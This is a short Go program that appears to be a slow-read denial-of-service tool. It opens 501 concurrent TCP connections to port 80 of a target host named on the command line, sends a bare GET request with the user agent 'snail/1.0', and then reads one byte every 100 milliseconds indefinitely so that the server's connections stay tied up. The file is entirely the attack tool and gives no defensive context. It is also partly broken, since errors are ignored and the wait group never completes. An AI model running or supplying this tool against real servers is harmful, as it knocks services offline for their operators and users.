package main

import (
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

func main() {
	fmt.Printf("%s started\n", os.Args[0])
	var wg sync.WaitGroup
	for i := 0; i <= 500; i++ {

		wg.Add(1)
		go request(os.Args[1])
	}

	wg.Wait()
}

func request(url string) {
	httpGet := fmt.Sprintf(`
GET /
Host: %s
Accept: */*
Accept-Language: en-us
Accept-Encoding: gzip, deflate
User-Agent: snail/1.0

`, url)

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:80", url))
	if err != nil {
		//log.Fatal(err)
	}
	defer conn.Close()

	b := make([]byte, 1)

	conn.Write([]byte(httpGet))

	for {
		_, err := conn.Read(b)
		if err != nil {
			//log.Fatal(err)
		}
		time.Sleep(100 * time.Millisecond)
		//fmt.Print(string(b))
	}
}
